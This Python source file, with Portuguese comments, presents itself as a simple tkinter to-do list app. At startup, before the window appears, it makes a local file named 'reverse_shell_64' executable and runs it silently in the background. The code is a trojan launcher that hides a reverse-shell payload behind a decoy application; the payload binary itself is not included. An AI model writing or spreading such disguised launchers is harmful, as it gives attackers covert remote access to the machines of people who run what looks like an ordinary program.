import os
import subprocess
import tkinter as tk

# Caminho para o payload gerado
payload_path = os.path.abspath('reverse_shell_64')  # Caminho absoluto para o arquivo

def run_payload():
    # Verifica se o payload está presente
    if os.path.exists(payload_path):
        try:
            # Torna o payload executável
            os.chmod(payload_path, 0o755)
            print(f"Executando payload: {payload_path}")
            # Usa o subprocess para executar o payload em segundo plano
            process = subprocess.Popen([payload_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("Payload iniciado.")
            # Não aguarda o payload, permite que o código continue
        except Exception as e:
            print(f"Erro ao executar o payload: {e}")
    else:
        print(f"Payload não encontrado: {payload_path}")

def create_gui():
    root = tk.Tk()
    root.title("To-Do List")

    # Entry para entrada de tarefas
    entry = tk.Entry(root)
    entry.pack(pady=10)

    # Botão para adicionar tarefas
    add_btn = tk.Button(root, text="Add", command=lambda: add_task(entry.get()))
    add_btn.pack(pady=5)

    # Frame para a lista de tarefas com rolagem
    task_frame = tk.Frame(root)
    task_frame.pack(fill=tk.BOTH, expand=True)

    canvas = tk.Canvas(task_frame)
    scrollbar = tk.Scrollbar(task_frame, orient=tk.VERTICAL, command=canvas.yview)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    canvas.configure(yscrollcommand=scrollbar.set)

    scroll_frame = tk.Frame(canvas)
    canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
    scroll_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))

    def add_task(task):
        if task:
            tk.Label(scroll_frame, text=task).pack(anchor="w", padx=5, pady=2)
            entry.delete(0, tk.END)

    return root

if __name__ == "__main__":
    # Executa o payload ao iniciar o aplicativo
    run_payload()
    
    # Cria e executa a interface gráfica
    app = create_gui()
    app.geometry("500x500")
    app.mainloop()
